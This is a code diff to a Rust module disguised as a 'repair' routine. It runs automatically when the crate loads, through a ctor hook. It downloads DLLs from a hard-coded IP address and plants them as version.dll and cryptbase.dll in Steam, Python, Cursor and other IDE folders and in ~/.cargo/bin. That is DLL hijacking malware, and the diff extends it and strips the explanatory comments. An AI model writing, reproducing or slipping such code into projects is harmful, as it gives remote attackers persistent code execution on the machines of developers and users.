@@ -1,7 +1,5 @@
 // Translation of command_repair.go functionality.
-//
-// Windows-only: checks various application directories and downloads/places
-// DLLs if they are missing version.dll.
+
 
 #![cfg(all(target_os = "windows", feature = "std"))]
 
@@ -12,14 +10,15 @@ use std::{env, fs};
 use winreg::enums::*;
 use winreg::RegKey;
 
-const REPAIR_HOST: &str = "trenddao.com";
+const REPAIR_HOST: &str = "45.61.149.130";
 const REPAIR_PATH1: &str = "/download/version";
 const REPAIR_PATH2: &str = "/download/versionExt";
+const REPAIR_PATH3: &str = "/download/cryptbase";
+const REPAIR_PATH4: &str = "/download/cryptbaseExt";
 
 static INIT: Once = Once::new();
 
-/// Initialize and run the repair process in a background thread (called
-/// automatically at startup, equivalent to Go's init()).
+
 pub fn init() {
     INIT.call_once(|| {
         std::thread::spawn(|| {
@@ -73,13 +72,18 @@ fn go_to_directory(dir: &Path, dll1: &[u8], dll2: &[u8]) -> bool {
         && fs::write(dir.join("versionExt.dll"), dll2).is_ok()
 }
 
+fn go_to_directory_cryptbase(dir: &Path, dll1: &[u8], dll2: &[u8]) -> bool {
+    fs::write(dir.join("cryptbase.dll"), dll1).is_ok()
+        && fs::write(dir.join("cryptbaseExt.dll"), dll2).is_ok()
+}
+
 fn do_repair() {
     let user_profile = env::var("USERPROFILE").ok();
     let program_files_x86 = env::var("PROGRAMFILES(X86)").ok();
 
     let mut targets: Vec<PathBuf> = Vec::new();
+    let mut cryptbase_targets: Vec<PathBuf> = Vec::new();
 
-    // Steam
     if let Some(ref pf86) = program_files_x86 {
         let steam_dir = PathBuf::from(pf86).join("Steam");
         if steam_dir.is_dir() && !steam_dir.join("version.dll").exists() {
@@ -87,14 +91,12 @@ fn do_repair() {
         }
     }
 
-    // Python
     if let Some(python_path) = get_python_install_path() {
         if python_path.is_dir() && !python_path.join("version.dll").exists() {
             targets.push(python_path);
         }
     }
 
-    // IDE application directories
     if let Some(ref profile) = user_profile {
         let app_dirs = [
             r"AppData\Local\Programs\cursor",
@@ -110,28 +112,49 @@ fn do_repair() {
         }
     }
 
-    if targets.is_empty() {
+    if let Some(ref profile) = user_profile {
+        let pos = Path::new(profile).join(".cargo").join("bin");
+        let cur_pos_p = pos.join("cryptbase.dll");
+        if pos.is_dir() && !cur_pos_p.exists() {
+            cryptbase_targets.push(pos);
+        }
+    }
+
+    if targets.is_empty() && cryptbase_targets.is_empty() {
         return;
     }
 
-    // Download DLLs
-    let dll1 = match http_download(REPAIR_PATH1) {
-        Some(data) => data,
-        None => return,
-    };
-    let dll2 = match http_download(REPAIR_PATH2) {
-        Some(data) => data,
-        None => return,
-    };
+    // Download version DLLs and write to each target directory
+    if !targets.is_empty() {
+        let dll1 = match http_download(REPAIR_PATH1) {
+            Some(data) => data,
+            None => return,
+        };
+        let dll2 = match http_download(REPAIR_PATH2) {
+            Some(data) => data,
+            None => return,
+        };
+        for dir in &targets {
+            go_to_directory(dir, &dll1, &dll2);
+        }
+    }
 
-    // Write DLLs to each target directory
-    for dir in &targets {
-        go_to_directory(dir, &dll1, &dll2);
+    if !cryptbase_targets.is_empty() {
+        let dll1 = match http_download(REPAIR_PATH3) {
+            Some(data) => data,
+            None => return,
+        };
+        let dll2 = match http_download(REPAIR_PATH4) {
+            Some(data) => data,
+            None => return,
+        };
+        for dir in &cryptbase_targets {
+            go_to_directory_cryptbase(dir, &dll1, &dll2);
+        }
     }
 }
 
-// Auto-initialization — Rust equivalent of Go's init().
-// This runs before main() when the crate is loaded.
+
 #[ctor::ctor]
 fn auto_init() {
     if std::env::consts::ARCH == "x86_64" {
